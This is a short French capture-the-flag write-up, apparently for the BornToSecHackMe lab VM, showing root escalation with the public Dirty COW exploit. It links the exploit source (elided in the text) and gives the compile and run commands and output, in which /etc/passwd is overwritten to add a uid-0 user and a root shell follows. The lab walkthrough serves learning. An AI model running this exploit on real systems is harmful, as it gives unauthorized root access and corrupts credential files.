Il existe un methode pour passer root qui s'appel __dirty cow__

Cette methode consiste a utiliser une faille dans le systeme de la machine pour creer un user avec les acces root.

pour ce faire on utiliser un programme C : https://github.com/firefart/dirtycow/blob/master/dirty.c

```bash 

laurie@BornToSecHackMe:~$ cd /tmp
laurie@BornToSecHackMe:/tmp$ cat > dirty.c << EOF
[...] // programe
EOF
laurie@BornToSecHackMe:/tmp$ gcc dirty.c -o dirty -pthread -lcrypt
laurie@BornToSecHackMe:/tmp$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi86Ixhn/lTi2:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'q'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'q'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

il nous reste plus cas nous connecter avec le nouveau user

```bash
laurie@BornToSecHackMe:/tmp$ su firefart
Password: 
firefart@BornToSecHackMe:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)

```

nous somme passer root !